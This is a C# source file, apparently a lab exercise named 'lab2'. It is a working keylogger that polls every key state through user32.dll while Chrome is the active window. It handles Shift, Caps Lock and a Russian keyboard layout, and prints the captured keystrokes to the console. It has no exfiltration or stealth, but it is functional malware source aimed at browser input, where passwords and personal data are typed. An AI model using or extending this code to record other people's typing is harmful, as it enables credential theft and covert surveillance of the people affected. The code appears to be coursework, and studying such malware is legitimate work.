using System;
using System.Diagnostics;
using System.Globalization;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace lab2
{
    class Program
    {
        [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hwnd, out int id);
        [DllImport("user32.dll")] static extern IntPtr GetKeyboardLayout(uint thread);

        private const string CHROME = "chrome";
        
        private static bool _isCaps;
        private static string _keyboardLayout;
        
        static void Main(string[] args)
        {
            while (true)
            {
                if(GetActiveWindow() == CHROME)
                {
                    Thread.Sleep(100);

                    for (int i = 0; i < 255; i++)
                    {
                        int state = GetAsyncKeyState(i);
                        if (state != 0)
                        {
                            _isCaps = Control.IsKeyLocked(Keys.CapsLock);
                            _keyboardLayout = GetKeyboardLayout();
                            Console.Write(GetSymbol(i));
                        }
                    }
                }
            }
        }
        
        private static string GetSymbol(int i)
        {
            var keyCode = (Keys) i;

            var inputData = string.Empty;
            
            switch (keyCode)
            {
                case Keys.Space:
                    inputData = " ";
                    break;
                
                case Keys.Enter:
                    inputData = "\n";
                    break;

                default:
                    inputData = _keyboardLayout == "ru" ? Translator.Translate(keyCode) : keyCode.ToString();
                    
                    switch (inputData.Length)
                    {
                        case 1:
                            var register = Control.ModifierKeys == Keys.Shift ^ _isCaps;
                            inputData = register ? inputData.ToUpper() : inputData.ToLower();
                            break;
                        
                        case 2 when inputData.Contains('D'):
                            inputData = inputData.Replace("D", string.Empty);
                            break;
                        
                        default:
                            inputData = string.Empty;
                            break;
                    }
                    
                    break;
            }
            return inputData;
        }

        private static string GetKeyboardLayout()
        {
            var foregroundWindow = GetForegroundWindow();
            var foregroundProcess = GetWindowThreadProcessId(foregroundWindow, out _);
            var keyboardLayout = GetKeyboardLayout(foregroundProcess).ToInt32() & 0xFFFF;
            return new CultureInfo(keyboardLayout).TwoLetterISOLanguageName;
        }

        private static string GetActiveWindow()
        {
            var foregroundWindow = GetForegroundWindow();
            GetWindowThreadProcessId(foregroundWindow, out var id);
            return Process.GetProcessById(id).ProcessName;
        }
    }
}